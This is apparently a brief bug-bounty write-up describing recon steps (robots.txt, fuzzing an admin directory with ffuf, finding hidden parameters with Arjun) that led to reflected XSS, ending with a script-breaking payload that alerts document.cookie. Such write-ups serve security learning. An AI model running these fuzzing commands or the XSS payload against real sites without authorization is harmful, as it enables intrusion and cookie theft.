# ***How reading robots.txt file got me 4 XSS reports? 💡💡***

### *1. Start doing Google Dorking [Found Nothing]*

### *2. Searched for the domain name at Wayback archive [Found Nothing]*

### *3. Opened robots.txt file to see what the developer hide from us*

### *4. Open source code > Search for any secrets or endpoints > [Found Nothing]*

### *5. Open JS files > Use any tool like gospider to extract secrets and Endpoints > [Found Nothing]*

### *6. Let’s FUZZ*
`ffuf -u https://sub.domain.com/admin/FUZZ -w aspfiles.txt -mc 200`

### *7. Found Endpoint:*
`https://sub.domain.com/admin/colorpicker_IEPatch.asp`

### *8. Use Arjun to find hidden parameter*
`arjun -u https://sub.domain.com/admin/colorpicker_IEPatch.asp`

### *9. Payload:* 
`</script><img src=x onerror=alert(document.cookie)>`
<br>&nbsp;

----
## ***Credit***
Based on [Ahmed Qaramany](https://c0nqr0r.medium.com/reading-robots-txt-got-me-4-xss-reports-9fd2234c635f)'s writeup.

----
## ***Support***
You can Follow [me](https://www.linkedin.com/in/bhavesh-pardhi-/) on LinkedIn or
<br><br>[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Support-orange?style=for-the-badge&logo=buy-me-a-coffee)](https://www.buymeacoffee.com/bhaveshpardhi)
